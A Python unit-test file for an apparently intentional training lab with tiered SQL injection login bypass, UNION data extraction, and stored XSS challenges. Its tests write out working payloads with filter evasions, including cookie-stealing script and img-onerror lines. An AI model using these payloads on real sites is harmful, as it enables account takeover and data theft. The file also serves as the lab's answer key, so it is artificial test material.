import unittest
import os
import sys
import json

# Add src to path
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'src')))

# Set explicit test flags
os.environ['FLAG_BLOG_SQLI_LOGIN_EASY'] = 'VULNLAB{login_easy_000000000000000000}'
os.environ['FLAG_BLOG_SQLI_LOGIN_MEDIUM'] = 'VULNLAB{login_med_1111111111111111111}'
os.environ['FLAG_BLOG_SQLI_LOGIN_HARD'] = 'VULNLAB{login_hard_222222222222222222}'

os.environ['FLAG_BLOG_SQLI_UNION_EASY'] = 'VULNLAB{union_easy_333333333333333333}'
os.environ['FLAG_BLOG_SQLI_UNION_MEDIUM'] = 'VULNLAB{union_med_4444444444444444444}'
os.environ['FLAG_BLOG_SQLI_UNION_HARD'] = 'VULNLAB{union_hard_555555555555555555}'

os.environ['FLAG_BLOG_SQLI_XSS_EASY'] = 'VULNLAB{xss_easy_66666666666666666666}'
os.environ['FLAG_BLOG_SQLI_XSS_MEDIUM'] = 'VULNLAB{xss_med_777777777777777777777}'
os.environ['FLAG_BLOG_SQLI_XSS_HARD'] = 'VULNLAB{xss_hard_88888888888888888888}'

from app import app, init_db


class TestBlogSqli(unittest.TestCase):
    def setUp(self):
        self.client = app.test_client()
        init_db()

    def test_01_healthcheck(self):
        res = self.client.get('/health')
        self.assertEqual(res.status_code, 200)
        data = res.get_json()
        self.assertEqual(data.get('status'), 'ok')

    # -------------------------------------------------------------
    # SQLi Login Tests
    # -------------------------------------------------------------
    def test_02_login_easy_bypass(self):
        # Easy login with ' OR 1=1--
        res = self.client.post('/login?difficulty=easy', json={
            'username': "' OR 1=1--",
            'password': 'any'
        })
        self.assertEqual(res.status_code, 200)
        data = res.get_json()
        self.assertTrue(data.get('success'))
        self.assertEqual(data.get('username'), 'admin')
        self.assertEqual(data.get('flag'), 'VULNLAB{login_easy_000000000000000000}')

    def test_03_login_medium_filter_and_bypasses(self):
        # 1. Blocked attempt with 'or'
        res_blocked = self.client.post('/login?difficulty=medium', json={
            'username': "' OR 1=1--",
            'password': 'any'
        })
        self.assertEqual(res_blocked.status_code, 400)

        # 2. Bypass with admin'/*
        res_bypass1 = self.client.post('/login?difficulty=medium', json={
            'username': "admin'/*",
            'password': 'any'
        })
        self.assertEqual(res_bypass1.status_code, 200)
        self.assertEqual(res_bypass1.get_json().get('flag'), 'VULNLAB{login_med_1111111111111111111}')

        # 3. Bypass with admin' #
        res_bypass2 = self.client.post('/login?difficulty=medium', json={
            'username': "admin' #",
            'password': 'any'
        })
        self.assertEqual(res_bypass2.status_code, 200)
        self.assertEqual(res_bypass2.get_json().get('flag'), 'VULNLAB{login_med_1111111111111111111}')

        # 4. Bypass with admin' || '1'='1
        res_bypass3 = self.client.post('/login?difficulty=medium', json={
            'username': "admin' || '1'='1",
            'password': 'any'
        })
        self.assertEqual(res_bypass3.status_code, 200)
        self.assertEqual(res_bypass3.get_json().get('flag'), 'VULNLAB{login_med_1111111111111111111}')

    def test_04_login_hard_filter_and_bypasses(self):
        # 1. Blocked attempt with spaces
        res_blocked = self.client.post('/login?difficulty=hard', json={
            'username': "admin' OR '1'='1",
            'password': 'any'
        })
        self.assertEqual(res_blocked.status_code, 400)

        # 2. Blocked attempt with comment
        res_blocked_comment = self.client.post('/login?difficulty=hard', json={
            'username': "admin'/*",
            'password': 'any'
        })
        self.assertEqual(res_blocked_comment.status_code, 400)

        # 3. Bypass with parentheses without spaces
        res_bypass1 = self.client.post('/login?difficulty=hard', json={
            'username': "admin'OR('1'='1')OR''='",
            'password': 'any'
        })
        self.assertEqual(res_bypass1.status_code, 200)
        self.assertEqual(res_bypass1.get_json().get('flag'), 'VULNLAB{login_hard_222222222222222222}')

        # 4. Bypass with tab characters
        res_bypass2 = self.client.post('/login?difficulty=hard', json={
            'username': "admin'\tOR\t''='",
            'password': 'any'
        })
        self.assertEqual(res_bypass2.status_code, 200)
        self.assertEqual(res_bypass2.get_json().get('flag'), 'VULNLAB{login_hard_222222222222222222}')

    # -------------------------------------------------------------
    # SQLi UNION Extraction Tests
    # -------------------------------------------------------------
    def test_05_union_easy(self):
        payload = "' UNION SELECT 1, name, flag, description, 'author' FROM flags--"
        res = self.client.get(f'/?difficulty=easy&q={payload}', headers={'Accept': 'application/json'})
        self.assertEqual(res.status_code, 200)
        content_str = res.get_data(as_text=True)
        self.assertIn('VULNLAB{union_easy_333333333333333333}', content_str)

    def test_06_union_medium(self):
        # Normal UNION SELECT gets stripped once
        payload_bypass = "' UNUNIONION SELSELECTECT 1, name, flag, description, 'author' FROM flags--"
        res = self.client.get(f'/?difficulty=medium&q={payload_bypass}', headers={'Accept': 'application/json'})
        self.assertEqual(res.status_code, 200)
        content_str = res.get_data(as_text=True)
        self.assertIn('VULNLAB{union_med_4444444444444444444}', content_str)

    def test_07_union_hard(self):
        # Blocked if space present
        res_blocked = self.client.get("/?difficulty=hard&q=' UNION SELECT 1,2,3,4,5 FROM flags--", headers={'Accept': 'application/json'})
        self.assertEqual(res_blocked.status_code, 400)

        # Bypass using inline comments without spaces
        payload_hard = "'/**/UNION/**/SELECT/**/1,name,flag,description,'author'/**/FROM/**/flags--"
        res = self.client.get(f'/?difficulty=hard&q={payload_hard}', headers={'Accept': 'application/json'})
        self.assertEqual(res.status_code, 200)
        content_str = res.get_data(as_text=True)
        self.assertIn('VULNLAB{union_hard_555555555555555555}', content_str)

    # -------------------------------------------------------------
    # Stored XSS Tests
    # -------------------------------------------------------------
    def test_08_xss_easy(self):
        # Submit comment with standard <script>
        self.client.post('/post/1/comment?difficulty=easy', data={
            'author_name': 'tester',
            'content': '<script>fetch("/api/exfil?c=" + document.cookie)</script>'
        })
        # Admin bot review
        res = self.client.post('/api/admin/visit-comments?difficulty=easy&post_id=1')
        self.assertEqual(res.status_code, 200)
        data = res.get_json()
        self.assertTrue(data.get('xss_triggered'))
        self.assertEqual(data.get('flag'), 'VULNLAB{xss_easy_66666666666666666666}')

    def test_09_xss_medium(self):
        # Standard lowercase <script> is stripped
        self.client.post('/post/1/comment?difficulty=medium', data={
            'author_name': 'tester_med_fail',
            'content': '<script>alert(1)</script>'
        })
        res1 = self.client.post('/api/admin/visit-comments?difficulty=medium&post_id=1')
        # Could trigger if earlier post had payload, so let's post to post 2
        self.client.post('/post/2/comment?difficulty=medium', data={
            'author_name': 'tester_med_fail2',
            'content': '<script>alert(1)</script>'
        })
        res2 = self.client.post('/api/admin/visit-comments?difficulty=medium&post_id=2')
        self.assertFalse(res2.get_json().get('xss_triggered'))

        # Bypass with <img src=x onerror=...>
        self.client.post('/post/2/comment?difficulty=medium', data={
            'author_name': 'tester_med_bypass',
            'content': '<img src=x onerror="fetch(\'/api/exfil?c=\' + document.cookie)">'
        })
        res3 = self.client.post('/api/admin/visit-comments?difficulty=medium&post_id=2')
        self.assertTrue(res3.get_json().get('xss_triggered'))
        self.assertEqual(res3.get_json().get('flag'), 'VULNLAB{xss_med_777777777777777777777}')

    def test_10_xss_hard(self):
        # <script> and whitespace+onerror stripped on post 3
        self.client.post('/post/3/comment?difficulty=hard', data={
            'author_name': 'tester_hard_fail',
            'content': '<img src=x onerror=alert(1)>'
        })
        res1 = self.client.post('/api/admin/visit-comments?difficulty=hard&post_id=3')
        self.assertFalse(res1.get_json().get('xss_triggered'))

        # Bypass with <svg/onload=...>
        self.client.post('/post/3/comment?difficulty=hard', data={
            'author_name': 'tester_hard_bypass',
            'content': '<svg/onload=alert(document.cookie)>'
        })
        res2 = self.client.post('/api/admin/visit-comments?difficulty=hard&post_id=3')
        self.assertTrue(res2.get_json().get('xss_triggered'))
        self.assertEqual(res2.get_json().get('flag'), 'VULNLAB{xss_hard_88888888888888888888}')


if __name__ == '__main__':
    unittest.main()
